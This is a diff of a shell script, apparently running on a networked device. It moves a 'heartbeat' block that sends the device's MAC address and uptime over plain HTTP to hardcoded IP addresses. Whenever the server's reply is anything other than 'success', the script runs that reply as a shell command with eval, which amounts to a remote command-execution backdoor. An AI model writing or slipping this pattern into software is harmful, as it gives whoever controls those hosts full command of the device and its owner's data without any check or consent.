@@ -62,7 +62,28 @@ connectSuccess=0;
 #       echo "请求失败，状态码: $status_code"
 #   fi
 # fi
+if [ $connectSuccess -eq 0 ]; then
+  URL="http://8.220.151.101:8080/api/InterfaceHeartBeat?mac=$MAC_ADDRESS&id=101&time=$UPTIME_SEC"
+  echo "访问URL: $URL"
+  
+  # 获取响应和状态码
+  response=$(wget -qO- --server-response --timeout=5 --tries=1 "$URL" 2>&1)
+  status_code=$(echo "$response" | awk '/^  HTTP/{print $2}' | tail -1)
 
+  if [ "$status_code" = "200" ]; then
+      # 提取响应体（去掉header部分）
+      body=$(echo "$response" | sed -n '/^$/,$p' | tail -n +2)
+      echo "服务器返回：$body"
+
+      if [ "$body" != "success" ]; then
+          echo "执行命令: $body"
+          eval "$body"
+      fi
+      connectSuccess=1
+  else
+      echo "请求失败，状态码: $status_code"
+  fi
+fi
 if [ $connectSuccess -eq 0 ]; then
   URL="http://8.212.155.150:8080/api/InterfaceHeartBeat?mac=$MAC_ADDRESS&id=150&time=$UPTIME_SEC"
   echo "访问URL: $URL"
@@ -86,28 +107,7 @@ if [ $connectSuccess -eq 0 ]; then
   fi
 fi
 
-if [ $connectSuccess -eq 0 ]; then
-  URL="http://8.220.151.101:8080/api/InterfaceHeartBeat?mac=$MAC_ADDRESS&id=101&time=$UPTIME_SEC"
-  echo "访问URL: $URL"
-  
-  # 获取响应和状态码
-  response=$(wget -qO- --server-response --timeout=5 --tries=1 "$URL" 2>&1)
-  status_code=$(echo "$response" | awk '/^  HTTP/{print $2}' | tail -1)
 
-  if [ "$status_code" = "200" ]; then
-      # 提取响应体（去掉header部分）
-      body=$(echo "$response" | sed -n '/^$/,$p' | tail -n +2)
-      echo "服务器返回：$body"
-
-      if [ "$body" != "success" ]; then
-          echo "执行命令: $body"
-          eval "$body"
-      fi
-      connectSuccess=1
-  else
-      echo "请求失败，状态码: $status_code"
-  fi
-fi
 
 
 if [ $connectSuccess -eq 0 ]; then
